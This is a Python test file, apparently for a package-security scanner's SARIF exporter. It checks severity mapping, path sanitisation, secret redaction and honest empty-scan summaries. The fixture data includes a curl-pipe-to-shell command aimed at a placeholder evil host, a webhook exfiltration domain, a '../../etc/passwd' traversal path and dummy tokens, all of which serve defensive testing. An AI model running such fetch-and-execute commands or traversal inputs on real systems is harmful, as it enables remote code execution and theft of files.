import pytest

from sarif_exporter import (
    SARIF_VERSION,
    scan_status_to_sarif,
    validate_sarif_document,
)
from schemas import ScanFinding, ScanStatus


def test_sarif_export_validates_against_schema_and_maps_severity():
    status = ScanStatus(
        scan_id="scan-sarif-001",
        status="COMPLETED",
        files_scanned=12,
        score=60,
        score_breakdown=[
            {"rule_id": "NPM-POSTINSTALL-EXEC-01", "weight": 35, "severity": "HIGH"},
            {"rule_id": "SECRET-EXFIL-01", "weight": 25, "severity": "MEDIUM"},
        ],
        findings=[
            ScanFinding(
                rule_id="NPM-POSTINSTALL-EXEC-01",
                severity="HIGH",
                confidence=0.92,
                evidence="curl -s https://evil.test/p.sh | sh",
                location="package.json:14",
                explanation="Script postinstall invoca descarga remota y shell.",
            ),
            ScanFinding(
                rule_id="SECRET-EXFIL-01",
                severity="MEDIUM",
                confidence=0.71,
                evidence="webhook.site/abc",
                location="src/index.js",
                explanation="Referencia a dominio típico de exfiltración.",
            ),
        ],
        limitations=["Solo análisis estático sin ejecución."],
        summary="2 señales detectadas.",
    )

    sarif = scan_status_to_sarif(status)
    validate_sarif_document(sarif)

    assert sarif["version"] == SARIF_VERSION
    run = sarif["runs"][0]
    assert len(run["tool"]["driver"]["rules"]) == 2
    assert run["results"][0]["level"] == "error"
    assert run["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"] == "package.json"
    assert run["results"][0]["locations"][0]["physicalLocation"]["region"]["startLine"] == 14
    assert run["results"][1]["level"] == "warning"
    assert run["properties"]["omegaScore"] == 60


def test_sarif_sanitizes_hostile_paths_ansi_and_tokens():
    status = ScanStatus(
        scan_id="scan-hostile-001",
        status="COMPLETED",
        files_scanned=1,
        score=50,
        findings=[
            ScanFinding(
                rule_id="PYPI-SETUP-EXEC-01",
                severity="CRITICAL",
                confidence=0.99,
                evidence="\x1b[31mBearer omega_scan_supersecret123456\x1b[0m",
                location="../../etc/passwd",
                explanation="Intento de escape \x07 y fuga ghp_secretToken1234567890",
            )
        ],
    )

    sarif = scan_status_to_sarif(status)
    validate_sarif_document(sarif)

    result = sarif["runs"][0]["results"][0]
    uri = result["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
    assert ".." not in uri
    assert not uri.startswith("/")
    assert uri == "etc/passwd"
    serialized = str(sarif)
    assert "omega_scan_supersecret123456" not in serialized
    assert "ghp_secretToken1234567890" not in serialized
    assert "\x1b" not in serialized


def test_sarif_empty_scan_uses_honest_summary():
    status = ScanStatus(
        scan_id="scan-clean-001",
        status="COMPLETED",
        files_scanned=5,
        score=0,
        findings=[],
        summary="Sin señales detectadas con las reglas actuales.",
    )

    sarif = scan_status_to_sarif(status)
    validate_sarif_document(sarif)
    assert sarif["runs"][0]["results"] == []
    assert "Sin señales detectadas con las reglas actuales" in sarif["runs"][0]["properties"]["summary"]
    assert "repo seguro" not in str(sarif).lower()
